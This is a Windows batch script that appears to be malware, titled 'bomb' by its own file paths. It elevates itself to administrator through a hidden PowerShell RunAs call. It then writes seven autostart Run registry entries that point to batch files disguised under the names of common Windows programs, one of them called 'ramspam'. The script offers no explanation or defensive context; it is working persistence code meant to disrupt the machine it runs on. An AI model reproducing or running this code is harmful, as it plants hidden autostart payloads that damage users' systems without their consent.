@echo off
call :Adm
chcp 866
color e
ver | find "5.0" >nul && exit
cls
goto as

:as
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v paint /t REG_SZ /d "c:\fikali\files\bomb\paint.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v iexplore /t REG_SZ /d "c:\fikali\files\bomb\iexplore.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d "c:\fikali\files\bomb\calc.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v control /t REG_SZ /d "c:\fikali\files\bomb\control.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v notepad /t REG_SZ /d "c:\fikali\files\bomb\notepad.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "c:\fikali\files\bomb\explorer.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ramspam /t REG_SZ /d "c:\fikali\files\bomb\ramspam.bat"
cls
exit

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)